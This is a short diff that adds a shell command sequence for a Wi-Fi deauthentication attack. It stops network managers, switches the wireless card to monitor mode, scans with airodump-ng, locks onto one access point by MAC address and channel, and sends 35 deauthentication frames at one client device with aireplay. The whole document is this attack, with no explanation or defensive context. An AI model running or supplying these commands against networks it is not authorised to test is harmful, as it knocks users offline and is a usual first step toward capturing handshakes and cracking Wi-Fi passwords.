@@ -1,0 +1,7 @@
+ifconfig wlp2s0 down
+airmon-ng check kill
+iwconfig wlp2s0 mode monitor
+ifconfig wlp2s0 up
+airodump-ng wlp2s0
+airodump-ng --bssid A0:14:3D:A5:BF:13 --channel 6 wlp2s0
+aireplay --deauth 35 -a A0:14:3D:A5:BF:13 -c 66:72:1F:C7:71:A6 wlp2s0
